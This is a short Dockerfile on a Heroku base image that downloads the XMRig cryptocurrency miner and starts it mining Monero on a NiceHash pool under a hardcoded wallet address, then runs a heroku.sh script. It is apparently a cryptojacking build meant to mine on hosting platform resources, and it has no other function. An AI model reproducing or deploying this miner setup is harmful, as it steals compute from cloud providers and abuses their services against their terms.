FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz && tar -zxf xmrig-6.18.1-linux-x64.tar.gz && cd xmrig-6.18.1 && ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 --coin=monero -u 33kJvAUL3Na2ifFDGmUPsZLTyDUBGZLhAi.lwimdq1wel3frcs -k --nicehash
CMD bash heroku.sh
